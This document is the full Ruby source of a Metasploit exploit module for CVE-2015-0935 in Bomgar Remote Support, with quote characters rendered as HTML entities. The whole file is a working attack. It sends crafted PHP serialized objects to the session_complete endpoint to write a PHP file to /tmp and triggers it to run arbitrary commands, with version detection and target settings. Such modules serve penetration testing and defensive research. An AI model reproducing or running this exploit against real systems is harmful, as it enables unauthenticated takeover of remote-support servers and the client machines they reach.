# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
 
  def initialize
    super(
      &#039;Name&#039;           => &#039;Bomgar Remote Support Unauthenticated Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in the Bomgar Remote Support, which
        deserializes user provided data using PHP&#039;s `unserialize` method.
        By providing an specially crafted PHP serialized object, it is possible
        to write arbitrary data to arbitrary files. This effectively allows the
        execution of arbitrary PHP code in the context of the Bomgar Remote Support
        system user.
 
        To exploit the vulnerability, a valid Logging Session ID (LSID) is required.
        It consists of four key-value pairs (i. e., &#039;h=[...];l=[...];m=[...];t=[...]&#039;)
        and can be retrieved by an unauthenticated user at the end of the process
        of submitting a new issue via the &#039;Issue Submission&#039; form.
 
        Versions before 15.1.1 are reported to be vulnerable.
      },
      &#039;Author&#039;         =>
        [
          &#039;Markus Wulftange&#039;,
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;DisclosureDate&#039; => &#039;May 5 2015&#039;,
      &#039;References&#039;     =>
        [
          [&#039;CWE&#039;, &#039;94&#039;],
          [&#039;CWE&#039;, &#039;502&#039;],
          [&#039;CVE&#039;, &#039;2015-0935&#039;],
          [&#039;US-CERT-VU&#039;, &#039;978652&#039;],
          [&#039;URL&#039;, &#039;http://codewhitesec.blogspot.com/2015/05/cve-2015-0935-bomgar-remote-support-portal.html&#039;],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        =>
        [
          [ &#039;Linux x86&#039;,
            {
              &#039;Platform&#039;        => &#039;linux&#039;,
              &#039;Arch&#039;            => ARCH_X86,
              &#039;CmdStagerFlavor&#039; => [ :echo, :printf ]
            }
          ],
          [ &#039;Linux x86_64&#039;,
            {
              &#039;Platform&#039;        => &#039;linux&#039;,
              &#039;Arch&#039;            => ARCH_X86_64,
              &#039;CmdStagerFlavor&#039; => [ :echo, :printf ]
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; =>
        {
          &#039;RPORT&#039;      => 443,
          &#039;SSL&#039;        => true,
          &#039;TARGETURI&#039;  => &#039;/session_complete&#039;,
        },
    )
 
    register_options(
      [
        OptString.new(&#039;LSID&#039;, [true, &#039;Logging Session ID&#039;]),
      ], self.class
    )
  end
 
  def check
    version = detect_version
 
    if version
      print_status("Version #{version} detected")
      if version < &#039;15.1.1&#039;
        return Exploit::CheckCode::Appears
      else
        return Exploit::CheckCode::Safe
      end
    end
 
    print_status("Version could not be detected")
    return Exploit::CheckCode::Unknown
  end
 
  def exploit
    execute_cmdstager
 
    handler
  end
 
  def execute_command(cmd, opts)
    tmpfile = "/tmp/#{rand_text_alphanumeric(10)}.php"
 
    vprint_status("Uploading payload to #{tmpfile} ...")
    upload_php_file(tmpfile, generate_stager_php(cmd))
 
    vprint_status("Triggering payload in #{tmpfile} ...")
    execute_php_file(tmpfile)
  end
 
  def detect_version
    res = send_request_raw(
      &#039;uri&#039; => &#039;/&#039;
    )
 
    if res and res.code == 200 and res.body.to_s =~ /<!--Product Version: (\d+\.\d+\.\d+)-->/
      return $1
    end
  end
 
  def upload_php_file(filepath, data)
    send_pso(generate_upload_file_pso(filepath, data))
  end
 
  def execute_php_file(filepath)
    send_pso(generate_autoload_pso(filepath))
  end
 
  def send_pso(pso)
    res = send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path),
      &#039;vars_post&#039; => {
        &#039;lsid&#039;    => datastore[&#039;LSID&#039;],
        &#039;survey&#039;  => pso,
      }
    )
 
    if res
      if res.code != 200
        fail_with(Failure::UnexpectedReply, "Unexpected response from server: status code #{res.code}")
      end
      if res.body.to_s =~ />ERROR: ([^<>]+)</
        fail_with(Failure::Unknown, "Error occured: #{$1}")
      end
    else
      fail_with(Failure::Unreachable, "Error connecting to the remote server") unless successful
    end
 
    res
  end
 
  def generate_stager_php(cmd)
    "<?php unlink(__FILE__); passthru(&#039;#{cmd.gsub(/[\\&#039;]/, &#039;\\\\\&&#039;)}&#039;);"
  end
 
  def generate_upload_file_pso(filepath, data)
    log_file = PHPObject.new(
      "Log_file",
      {
        "_filename"   => filepath,
        "_lineFormat" => "",
        "_eol"        => data,
        "_append"     => false,
      }
    )
    logger = PHPObject.new(
      "Logger",
      {
        "\0Logger\0_logs" => [ log_file ]
      }
    )
    tracer = PHPObject.new(
      "Tracer",
      {
        "\0Tracer\0_log" => logger
      }
    )
 
    serialize(tracer)
  end
 
  def generate_autoload_pso(filepath)
    object = PHPObject.new(
      filepath.chomp(&#039;.php&#039;).gsub(&#039;/&#039;, &#039;_&#039;),
      {}
    )
 
    serialize(object)
  end
 
  class PHPObject
    attr_reader :name, :members
 
    def initialize(name, members)
      @name = name
      @members = members
    end
  end
 
  def serialize(value)
    case value.class.name.split(&#039;::&#039;).last
      when &#039;Array&#039; then serialize_array_numeric(value)
      when &#039;Fixnum&#039; then serialize_integer(value)
      when &#039;Float&#039; then serialize_double(value)
      when &#039;Hash&#039; then serialize_array_assoc(value)
      when &#039;Nil&#039; then serialize_nil
      when &#039;PHPObject&#039; then serialize_object(value)
      when &#039;String&#039; then serialize_string(value)
      when &#039;TrueClass&#039;, &#039;FalseClass&#039; then serialize_boolean(value)
      else raise "Value of #{value.class} cannot be serialized"
    end
  end
 
  def serialize_array_numeric(a)
    "a:#{a.size}:{" + a.each_with_index.map { |v, i|
      serialize_integer(i) + serialize(v)
    }.join + "}"
  end
 
  def serialize_array_assoc(h)
    "a:#{h.size}:{" + h.each_pair.map { |k, v|
      serialize_string(k) + serialize(v)
    }.join + "}"
  end
 
  def serialize_boolean(b)
    "b:#{b ? &#039;1&#039; : &#039;0&#039;};"
  end
 
  def serialize_double(f)
    "d:#{f};"
  end
 
  def serialize_integer(i)
    "i:#{i};"
  end
 
  def serialize_null
    "N;"
  end
 
  def serialize_object(o)
    "O:#{serialize_string(o.name)[2..-2]}:#{serialize_array_assoc(o.members)[2..-1]}"
  end
 
  def serialize_string(s)
    "s:#{s.size}:\"#{s}\";"
  end
 
end

